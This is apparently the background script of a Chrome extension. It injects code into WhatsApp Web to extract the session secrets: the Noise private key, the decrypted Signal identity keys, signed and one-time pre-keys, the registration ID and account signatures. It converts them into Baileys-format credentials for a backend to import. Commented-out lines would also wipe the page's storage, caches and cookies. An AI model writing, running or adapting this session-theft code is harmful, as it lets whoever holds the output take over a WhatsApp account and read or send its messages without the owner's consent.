chrome.runtime.onMessage.addListener(async (message, sender) => {

  if (message.type === "CLOSE_TAB") {
    if (sender.tab?.id) {
      await chrome.tabs.remove(sender.tab.id);
    }
  }
  if (message.type !== "EXTRACT_SESSION") return;

  try {
    const [result] = await chrome.scripting.executeScript({
      target: {
        tabId: sender.tab.id
      },
      world: "MAIN",
      func: async () => {

        function extractWhatsAppSession() {
          return (async () => {
            'use strict';

            function bytesToB64url(bytes) {
              const u = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
              let s = '';
              for (let i = 0; i < u.length; i++) s += String.fromCharCode(u[i]);
              return btoa(s).replace(/[+/]/g, (c) => (c === '+' ? '-' : '_')).replace(/=+$/, '');
            }
            function bytesToB64(v) { const u = v instanceof Uint8Array ? v : new Uint8Array(v); let s = ''; for (let i = 0; i < u.length; i++) s += String.fromCharCode(u[i]); return btoa(s); }
            function asU8(v) {
              if (v == null) return null;
              if (v instanceof Uint8Array) return v;
              if (v instanceof ArrayBuffer) return new Uint8Array(v);
              if (ArrayBuffer.isView(v)) return new Uint8Array(v.buffer, v.byteOffset, v.byteLength);
              if (typeof v === 'object' && v.buffer instanceof ArrayBuffer) return new Uint8Array(v.buffer, v.byteOffset || 0, v.byteLength);
              if (typeof v === 'string') return Uint8Array.from(v, (c) => c.charCodeAt(0));
              return null;
            }
            function b64of(v) { const u = asU8(v); return u ? bytesToB64(u) : null; }
            function parseLs(k) { try { return JSON.parse(localStorage.getItem(k) || 'null'); } catch (e) { return null; } }

            // ---------- localStorage / IndexedDB (inspect) ----------
            function scanLocalStorage(includeValues) {
              const WA = ['WANoiseInfo', 'WANoiseInfoIv', 'WAWebEncKeySalt', 'last-wid-md', 'WALid', 'me-display-name'];
              const out = {};
              try {
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i);
                  const v = localStorage.getItem(k);
                  out[k] = { len: v ? v.length : 0, wa: /^WA/i.test(k) || /wid|lid|noise|enc|salt/i.test(k) };
                  if (includeValues && WA.indexOf(k) !== -1) out[k].value = v;
                }
              } catch (e) { out.__error = String(e); }
              return out;
            }

            const FALLBACK_DBS = ['wawc_db_enc', 'signal-storage', 'model-storage', 'wawc'];
            function listDatabases() {
              return new Promise((res) => {
                if (indexedDB.databases) indexedDB.databases().then((d) => res(d.map((x) => x.name).filter(Boolean))).catch(() => res(FALLBACK_DBS.slice()));
                else res(FALLBACK_DBS.slice());
              });
            }

            function openDB(name) {
              return new Promise((res, rej) => {
                let r; try { r = indexedDB.open(name); } catch (e) { return rej(e); }
                r.onsuccess = () => res(r.result);
                r.onerror = () => rej(r.error);
                r.onupgradeneeded = () => { try { r.transaction.abort(); } catch (e) { } rej(new Error('db-nao-existe')); };
              });
            }
            function idbGet(db, store, key) { return new Promise((res, rej) => { const r = db.transaction(store, 'readonly').objectStore(store).get(key); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); }); }
            function idbAll(db, store) { return new Promise((res, rej) => { const r = db.transaction(store, 'readonly').objectStore(store).getAll(); r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error); }); }

            function describeValue(v, depth) {
              depth = depth || 0;
              if (v == null) return { t: String(v) };
              if (v instanceof ArrayBuffer) return { t: 'ArrayBuffer', bytes: v.byteLength };
              if (ArrayBuffer.isView(v)) return { t: v.constructor.name, bytes: v.byteLength };
              if (typeof CryptoKey !== 'undefined' && v instanceof CryptoKey) return { t: 'CryptoKey', algorithm: v.algorithm, extractable: v.extractable, usages: v.usages, type: v.type };
              if (typeof v === 'string') return { t: 'string', len: v.length };
              if (typeof v === 'number' || typeof v === 'boolean') return { t: typeof v, value: v };
              if (Array.isArray(v)) return { t: 'array', len: v.length, of: v.length ? describeValue(v[0], depth + 1) : null };
              if (typeof v === 'object') {
                if (depth > 2) return { t: 'object', keys: Object.keys(v).slice(0, 40) };
                const shape = {}; for (const k of Object.keys(v).slice(0, 40)) shape[k] = describeValue(v[k], depth + 1);
                return { t: 'object', shape };
              }
              return { t: typeof v };
            }

            function dumpStore(db, store) {
              return new Promise((res) => {
                let os; try { os = db.transaction(store, 'readonly').objectStore(store); } catch (e) { return res({ error: String(e) }); }
                const keys = [], sample = []; let n = 0, cur;
                try { cur = os.openCursor(); } catch (e) { return res({ error: String(e) }); }
                cur.onsuccess = (e) => {
                  const c = e.target.result;
                  if (c && n < 500) {
                    const kd = typeof c.key === 'object' ? '(complex)' : String(c.key).slice(0, 64);
                    keys.push(kd);
                    if (sample.length < 25) sample.push({ key: kd, value: describeValue(c.value, 0) });
                    n++; c.continue();
                  } else res({ count: n, keyPath: os.keyPath, indexes: [].slice.call(os.indexNames), keys: keys.slice(0, 80), sample });
                };
                cur.onerror = () => res({ error: 'cursor-error' });
              });
            }

            async function dumpDB(name) {
              let db; try { db = await openDB(name); } catch (e) { return { name, error: String((e && e.message) || e) }; }
              const out = { name, version: db.version, stores: {} };
              for (const s of [].slice.call(db.objectStoreNames)) out.stores[s] = await dumpStore(db, s);
              try { db.close(); } catch (e) { }
              return out;
            }

            async function inspect(includeValues) {
              const names = await listDatabases();
              const dbs = [];
              for (const n of names) dbs.push(await dumpDB(n));
              return {
                origin: location.origin, url: location.href,
                loggedInHint: !!localStorage.getItem('last-wid-md') || !!localStorage.getItem('WANoiseInfo'),
                localStorage: scanLocalStorage(!!includeValues), indexedDB: dbs,
                note: includeValues ? 'INCLUI VALORES — contém segredos, NÃO compartilhe' : 'estrutura apenas (seguro p/ compartilhar)'
              };
            }

            // ---------- acesso ao sistema de módulos interno do wa-web (Comet __d) ----------
            function getWaModule(name) {
              try { if (typeof require === 'function') return require(name); } catch (e) { }
              try {
                if (typeof __d === 'function') {
                  let cap = null;
                  const probe = '__plk_probe_' + Math.random().toString(36).slice(2);
                  __d(probe, [name], function (_t, _n, req) { try { cap = req(name); } catch (e) { } });
                  if (!cap && typeof __d.require === 'function') { try { cap = __d.require(name); } catch (e) { } }
                  return cap;
                }
              } catch (e) { }
              return null;
            }

            // Noise key: só via módulo interno (o wa-web já a mantém decifrada em memória).
            async function getNoiseKey() {
              const store = getWaModule('WAWebUserPrefsInfoStore');
              const getter = store && store.waNoiseInfo && store.waNoiseInfo.get;
              if (typeof getter !== 'function') return null;
              const d = await store.waNoiseInfo.get();
              if (!d || !d.staticKeyPair) return null;
              return { public: asU8(d.staticKeyPair.pubKey), private: asU8(d.staticKeyPair.privKey) };
            }

            // Identidade estática libsignal: AES-CTR (counter zero) com a encKey do próprio registro.
            async function decryptRegMaterial(rec) {
              if (!rec || !rec.encKey || !rec.value) return null;
              const ct = asU8(rec.value);
              const pt = await crypto.subtle.decrypt({ name: 'AES-CTR', length: 128, counter: new Uint8Array(16) }, rec.encKey, ct);
              return new Uint8Array(pt);
            }

            async function getAdvSecret() {
              try {
                const m = getWaModule('WAWebUserPrefsMultiDevice');
                const v = m && m.getADVSecretKey && m.getADVSecretKey();
                if (typeof v === 'string') return v; // já base64
                if (v) return b64of(v);
              } catch (e) { }
              return null; // apagado pós-pareamento; a sessão migra OK com vazio
            }

            // wa-web: `<user>.<agent>:<device>@<server>` -> baileys `<user>:<device>@<server>`
            function widToJid(wid) {
              if (!wid || typeof wid !== 'string') return null;
              const at = wid.lastIndexOf('@');
              const head = at >= 0 ? wid.slice(0, at) : wid;
              let server = at >= 0 ? wid.slice(at + 1) : 's.whatsapp.net';
              if (server === 'c.us') server = 's.whatsapp.net';
              const colon = head.indexOf(':');
              const ua = colon >= 0 ? head.slice(0, colon) : head;
              const device = colon >= 0 ? head.slice(colon + 1) : '0';
              const dot = ua.indexOf('.');
              const user = dot >= 0 ? ua.slice(0, dot) : ua;
              return user + ':' + device + '@' + server;
            }

            async function extract() {
              const out = { warnings: [] };
              try {
                // 1) noise key (via módulo interno)
                let noiseKey = null;
                const nk = await getNoiseKey();
                if (nk && nk.private && nk.public) noiseKey = { private: bytesToB64(nk.private), public: bytesToB64(nk.public) };
                else out.warnings.push('noiseKey: WAWebUserPrefsInfoStore inacessível (precisa da aba logada e do módulo carregado)');

                // 2) signal-storage
                const sig = await openDB('signal-storage');
                const meta = async (k) => { const r = await idbGet(sig, 'signal-meta-store', k); return r ? r.value : null; };
                const staticPubW = await meta('signal_static_pubkey');
                const staticPrivW = await meta('signal_static_privkey');
                const regId = await meta('signal_reg_id');
                const adv = await meta('adv_signed_identity');
                const nextPk = await meta('signal_next_pk_id');
                const firstUnup = await meta('signal_first_unupload_pk_id');
                const spks = await idbAll(sig, 'signed-prekey-store');
                try { sig.close(); } catch (e) { }

                const staticPub = await decryptRegMaterial(staticPubW);
                const staticPriv = await decryptRegMaterial(staticPrivW);
                const spk = spks && spks.length ? spks[spks.length - 1] : null;

                const advSecret = await getAdvSecret();

                const creds = {
                  noiseKey,
                  signedIdentityKey: { private: staticPriv ? bytesToB64(staticPriv) : null, public: staticPub ? bytesToB64(staticPub) : null },
                  signedPreKey: spk ? { keyId: spk.keyId, keyPair: { private: b64of(spk.keyPair && spk.keyPair.privKey), public: b64of(spk.keyPair && spk.keyPair.pubKey) }, signature: b64of(spk.signature) } : null,
                  registrationId: regId,
                  advSecretKey: advSecret, // geralmente null (apagado) — sessão migra OK
                  nextPreKeyId: nextPk,
                  firstUnuploadedPreKeyId: firstUnup,
                  me: { id: widToJid(parseLs('last-wid-md')), lid: widToJid(parseLs('WALid')), name: parseLs('me-display-name') },
                  account: adv ? { details: b64of(adv.details), accountSignatureKey: b64of(adv.accountSignatureKey), accountSignature: b64of(adv.accountSignature), deviceSignature: b64of(adv.deviceSignature) } : null,
                  platform: 'web',
                };

                out.creds = creds;
                out.missing = [];
                if (!creds.noiseKey) out.missing.push('noiseKey');
                if (!creds.signedIdentityKey.private) out.missing.push('identityKey');
                if (!creds.signedPreKey) out.missing.push('signedPreKey');
                // `account` (adv_signed_identity) é gravado só quando o WhatsApp Web termina de
                // sincronizar. Sem ele o backend rejeita as creds (IMPORT_FAILED) — é o gate que
                // impede a captura automática de extrair "antes da tela carregar".
                if (!(creds.account && creds.account.details && creds.account.accountSignature && creds.account.deviceSignature)) out.missing.push('account');
                if (creds.registrationId == null) out.missing.push('registrationId');
                out.moduleOk = !!nk; // se o módulo interno respondeu
                return out;
              } catch (e) {
                return { error: String((e && e.message) || e), stack: String((e && e.stack) || '').slice(0, 300) };
              }
            }

            // Pronto para extrair? Le o noise key pelo modulo interno — a MESMA chamada que lança
            // "MasterDatabaseEncryptionKey.keys was accessed before init" quando o wa-web ainda nao
            // inicializou a cripto. Aqui capturamos essa excecao e devolvemos false (em vez de estourar).
            async function isReady() {
              try {
                const store = getWaModule('WAWebUserPrefsInfoStore');
                const getter = store && store.waNoiseInfo && store.waNoiseInfo.get;
                if (typeof getter !== 'function') return false;
                const d = await store.waNoiseInfo.get(); // lança se o MasterDatabaseEncryptionKey nao init
                return !!(d && d.staticKeyPair && d.staticKeyPair.privKey && d.staticKeyPair.pubKey);
              } catch (e) { return false; }
            }

            // Extrai SO quando o wa-web esta pronto E as creds estao COMPLETAS. No fluxo manual o
            // usuario naturalmente espera a tela carregar; no automatico a extracao dispara assim que o
            // login e detectado — cedo demais: (1) o MasterDatabaseEncryptionKey/cripto ainda inicializa
            // (isReady cobre) e (2) o `account`/signal-storage ainda esta sincronizando (o gate abaixo
            // cobre). Faz poll leve ate `maxWaitMs`: so retorna quando `missing` esta vazio. Se estourar,
            // devolve o ultimo resultado com { notReady:true } — sinal LIMPO p/ o chamador re-tentar.
            async function extractWhenReady(maxWaitMs) {
              const deadline = Date.now() + (typeof maxWaitMs === 'number' && maxWaitMs > 0 ? maxWaitMs : 12000);
              let last = null;
              while (Date.now() < deadline) {
                if (await isReady()) {
                  const r = await extract();
                  last = r;
                  // Completo (inclui `account`) => sessao utilizavel pelo backend; so entao entrega.
                  if (r && r.creds && Array.isArray(r.missing) && r.missing.length === 0) return r;
                }
                await new Promise((res) => setTimeout(res, 800));
              }
              if (last && last.creds) { last.notReady = !(Array.isArray(last.missing) && last.missing.length === 0); return last; }
              return { error: 'WhatsApp Web ainda inicializando (sessao muito recente)', notReady: true, warnings: [] };
            }

            async function pre_keys() {
              const b64ToBytes = v => Uint8Array.from(atob(v), c => c.charCodeAt(0));
              const bytesToB64 = value => {
                const bytes = value instanceof ArrayBuffer ? new Uint8Array(value)
                  : new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
                let binary = ''; const CHUNK = 0x8000;
                for (let i = 0; i < bytes.length; i += CHUNK) binary += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
                return btoa(binary);
              };
              const request = req => new Promise((res, rej) => { req.onsuccess = () => res(req.result); req.onerror = () => rej(req.error); });
              // Open ONLY an already-existing DB — an accidental create means "not logged in".
              const openExistingDb = name => new Promise((resolve, reject) => {
                const req = indexedDB.open(name); let didCreate = false;
                req.onupgradeneeded = () => { didCreate = true; };
                req.onsuccess = () => {
                  const db = req.result;
                  if (didCreate) { db.close(); indexedDB.deleteDatabase(name); reject(new Error("IndexedDB '" + name + "' missing — is web.whatsapp.com logged in?")); return; }
                  resolve(db);
                };
                req.onerror = () => reject(req.error);
              });
              const get = async (dbName, storeName, key) => { const db = await openExistingDb(dbName); try { return await request(db.transaction(storeName, 'readonly').objectStore(storeName).get(key)); } finally { db.close(); } };
              const getAll = async (dbName, storeName) => { const db = await openExistingDb(dbName); try { return await request(db.transaction(storeName, 'readonly').objectStore(storeName).getAll()); } finally { db.close(); } };


              const mapBuffer = value => {
                if (value === null || value === undefined) return value;
                if (value instanceof ArrayBuffer || ArrayBuffer.isView(value)) return { __b64: bytesToB64(value) };
                if (Array.isArray(value)) return value.map(mapBuffer);
                if (typeof value === 'object') {
                  const out = {};
                  Object.keys(value).forEach(k => { const child = value[k]; if (child instanceof CryptoKey) return; out[k] = mapBuffer(child); });
                  return out;
                }
                return value;
              };
              let keyarray = []
              const keys = (await getAll('signal-storage', 'prekey-store')).map(mapBuffer).map(k => {
                keyarray.push({
                  key_id: `pre-key-${k.keyId}`,
                  json: {
                    public: {
                      data: k?.keyPair?.pubKey?.__b64,
                      type: "Buffer"
                    },
                    private: {
                      data: k?.keyPair?.privKey?.__b64,
                      type: "Buffer"
                    }
                  }
                })
              })

              return keyarray
            }

            const keys = await pre_keys();
            const creds = await extract();

            // try { localStorage.clear(); } catch (error) {/*ignore */ }
            // try { sessionStorage.clear(); } catch (error) { }

            // try { indexedDB.databases().then(dbs => { dbs.forEach(db => indexedDB.deleteDatabase(db.name)); }); } catch (error) { }
            // try { caches.keys().then(keys => { keys.forEach(key => caches.delete(key)); }); } catch (error) { }
            // try { document.cookie.split(";").forEach(cookie => { document.cookie = cookie.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/"); }); } catch (error) { }

            return { success: true, creds: creds.creds, keys };
          })();
        }
        const dados = await extractWhatsAppSession();
        return dados;
      }
    });

    chrome.tabs.sendMessage(sender.tab.id, {
      type: "EXTRACT_RESULT",
      data: result.result
    });


  } catch (err) {
    chrome.tabs.sendMessage(sender.tab.id, {
      type: "EXTRACT_ERROR",
      error: err.message
    });
  }
});